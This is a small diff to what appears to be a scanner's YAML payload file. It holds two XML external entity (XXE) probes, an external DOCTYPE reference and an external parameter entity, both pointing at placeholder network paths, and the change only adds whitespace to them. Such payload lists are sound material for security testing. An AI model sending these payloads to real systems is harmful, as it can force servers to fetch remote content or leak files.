@@ -1,6 +1,6 @@
 payload:
-  - '<!DOCTYPE x SYSTEM "//x/x"><x>a</x>'
-  - '<!DOCTYPE x [ <!ENTITY % y SYSTEM "//y/y"> %y; ]><x>a</x>'
+  - '<!DOCTYPE x SYSTEM "//x/x" > <x>a</x>'
+  - '<!DOCTYPE x [ <!ENTITY % y SYSTEM "//y/y" > %y; ]><x>a</x>'
 encoder:
   - Base64
   - Url
